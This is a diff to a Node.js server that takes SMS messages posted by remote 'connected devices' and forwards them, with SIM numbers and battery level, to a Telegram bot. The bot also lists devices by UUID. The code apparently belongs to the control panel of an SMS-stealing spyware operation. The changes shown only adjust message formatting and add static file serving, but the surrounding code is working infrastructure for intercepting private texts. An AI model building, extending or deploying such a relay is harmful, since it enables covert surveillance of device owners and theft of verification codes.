@@ -20,6 +20,7 @@ if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});
 const app = express();
 app.use(bodyParser.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // ===== TELEGRAM BOT =====
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -91,8 +92,15 @@ app.post('/sms', (req, res) => {
   `\n🔋 *Battery Level:* ${battery || 'N/A'}%` +
   `\n🪪 *SIM1 Number:* ${device.sim1 || 'N/A'}` +
   `\n🪪 *SIM2 Number:* ${device.sim2 || 'N/A'}` +
-  `\n\n✉️ *From:* \`${from}\`` +
-  `\n\`\`\`📝 *Message:* \n${body}\`\`\`` +
+  `\n\n✉️ *From:* 
+${from}
+` +
+  `
+
+📝 *Message:* 
+${body}
+
+` +
   `\n\n📶 *SIM Slot:* ${sim}` +
   `\n⏰ *Received At:* ${new Date(timestamp).toLocaleString()}` +
   `\n\n👨‍💻 _Developer: ${DEVELOPER}_`;
@@ -197,7 +205,9 @@ bot.on('message', msg => {
     if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
     let out = '📱 *Connected Devices:*\n\n';
     for (const [uuid, d] of devices.entries()) {
-      out += `${formatDevice(d)}\n🆔 UUID: \`${uuid}\`\n\n`;
+      out += `${formatDevice(d)}\n🆔 UUID: 
+${uuid}
+\n`;
     }
     bot.sendMessage(chatId, out, { parse_mode: 'Markdown' });
   }
@@ -427,7 +437,8 @@ bot.on('callback_query', cb => {
     case 'device_info': {
       const d = devices.get(uuid);
       if (!d) return bot.answerCallbackQuery(cb.id, { text: 'Device not found' });
-      let msg = `📋 *Device Information*\n\n${formatDevice(d)}\n🆔 *UUID:* \`${uuid}\`\n\n👨‍💻 _Developer: ${DEVELOPER}_`;
+      let msg = `📋 *Device Information*\n\n${formatDevice(d)}\n🆔 *UUID:* 
+${uuid}\n\n👨‍💻 _Developer: ${DEVELOPER}_`;
       bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
       bot.answerCallbackQuery(cb.id);
       break;
